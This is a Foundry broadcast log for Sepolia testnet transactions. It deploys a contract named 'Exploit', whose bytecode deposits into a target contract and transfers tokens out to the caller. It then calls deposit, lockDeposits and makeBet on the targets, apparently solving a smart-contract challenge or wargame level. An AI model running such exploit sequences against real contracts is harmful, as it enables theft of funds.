{
  "transactions": [
    {
      "hash": "0x14e5bceab957962a9955d4ccf0f274474e41c020be9d049d8a3f28d693e7358a",
      "transactionType": "CREATE",
      "contractName": "Exploit",
      "contractAddress": "0xca1873f3d5c295f5c8520b0a112bd46690178450",
      "function": null,
      "arguments": null,
      "transaction": {
        "from": "0x965b0e63e00e7805569ee3b428cf96330dfc57ef",
        "gas": "0x60655",
        "value": "0x0",
        "input": "0x6080604052348015600e575f5ffd5b506104888061001c5f395ff3fe60806040526004361061001d575f3560e01c8063f340fa0114610021575b5f5ffd5b61003b6004803603810190610036919061023d565b61003d565b005b66038d7ea4c680003414610086576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161007d906102c2565b60405180910390fd5b5f8190508073ffffffffffffffffffffffffffffffffffffffff1663b6b55f25345f6040518363ffffffff1660e01b81526004016100c4919061032b565b5f604051808303818588803b1580156100db575f5ffd5b505af11580156100ed573d5f5f3e3d5ffd5b50505050508073ffffffffffffffffffffffffffffffffffffffff1663996c6cc36040518163ffffffff1660e01b8152600401602060405180830381865afa15801561013b573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061015f9190610358565b73ffffffffffffffffffffffffffffffffffffffff1663a9059cbb33600a6040518363ffffffff1660e01b815260040161019a9291906103cb565b6020604051808303815f875af11580156101b6573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101da9190610427565b505050565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61020c826101e3565b9050919050565b61021c81610202565b8114610226575f5ffd5b50565b5f8135905061023781610213565b92915050565b5f60208284031215610252576102516101df565b5b5f61025f84828501610229565b91505092915050565b5f82825260208201905092915050565b7f496e76616c6964206465706f73697420616d6f756e74000000000000000000005f82015250565b5f6102ac601683610268565b91506102b782610278565b602082019050919050565b5f6020820190508181035f8301526102d9816102a0565b9050919050565b5f819050919050565b5f819050919050565b5f819050919050565b5f61031561031061030b846102e0565b6102f2565b6102e9565b9050919050565b610325816102fb565b82525050565b5f60208201905061033e5f83018461031c565b92915050565b5f8151905061035281610213565b92915050565b5f6020828403121561036d5761036c6101df565b5b5f61037a84828501610344565b91505092915050565b61038c81610202565b82525050565b5f819050919050565b5f6103b56103b06103ab84610392565b6102f2565b6102e9565b9050919050565b6103c58161039b565b82525050565b5f6040820190506103de5f830185610383565b6103eb60208301846103bc565b9392505050565b5f8115159050919050565b610406816103f2565b8114610410575f5ffd5b50565b5f81519050610421816103fd565b92915050565b5f6020828403121561043c5761043b6101df565b5b5f61044984828501610413565b9150509291505056fea264697066735822122049483fbcce6eea7fa75555fe36fa624b6c22f4360fda8ecf544e958ff0bd58f264736f6c634300081d0033",
        "nonce": "0x29f",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": "Exploit",
      "contractAddress": "0xca1873f3d5c295f5c8520b0a112bd46690178450",
      "function": "deposit(address)",
      "arguments": [
        "0x5f74D38619852d4a8F538F35eFA8b93099c9196E"
      ],
      "transaction": {
        "from": "0x965b0e63e00e7805569ee3b428cf96330dfc57ef",
        "to": "0xca1873f3d5c295f5c8520b0a112bd46690178450",
        "gas": "0x27b24",
        "value": "0x38d7ea4c68000",
        "input": "0xf340fa010000000000000000000000005f74d38619852d4a8f538f35efa8b93099c9196e",
        "nonce": "0x2a0",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x5f74d38619852d4a8f538f35efa8b93099c9196e",
      "function": "deposit(uint256)",
      "arguments": [
        "0"
      ],
      "transaction": {
        "from": "0x965b0e63e00e7805569ee3b428cf96330dfc57ef",
        "to": "0x5f74d38619852d4a8f538f35efa8b93099c9196e",
        "gas": "0x163d3",
        "value": "0x38d7ea4c68000",
        "input": "0xb6b55f250000000000000000000000000000000000000000000000000000000000000000",
        "nonce": "0x2a1",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x5f74d38619852d4a8f538f35efa8b93099c9196e",
      "function": "lockDeposits()",
      "arguments": [],
      "transaction": {
        "from": "0x965b0e63e00e7805569ee3b428cf96330dfc57ef",
        "to": "0x5f74d38619852d4a8f538f35efa8b93099c9196e",
        "gas": "0xea71",
        "value": "0x0",
        "input": "0xd088a231",
        "nonce": "0x2a2",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xba8192b7865310cd5229de75bd67d47e91bf30d0",
      "function": "makeBet(address)",
      "arguments": [
        "0x965B0E63e00E7805569ee3B428Cf96330DFc57EF"
      ],
      "transaction": {
        "from": "0x965b0e63e00e7805569ee3b428cf96330dfc57ef",
        "to": "0xba8192b7865310cd5229de75bd67d47e91bf30d0",
        "gas": "0x142f1",
        "value": "0x0",
        "input": "0x880c4270000000000000000000000000965b0e63e00e7805569ee3b428cf96330dfc57ef",
        "nonce": "0x2a3",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [],
  "libraries": [],
  "pending": [
    "0x14e5bceab957962a9955d4ccf0f274474e41c020be9d049d8a3f28d693e7358a"
  ],
  "returns": {},
  "timestamp": 1758424412,
  "chain": 11155111,
  "commit": "000ae59"
}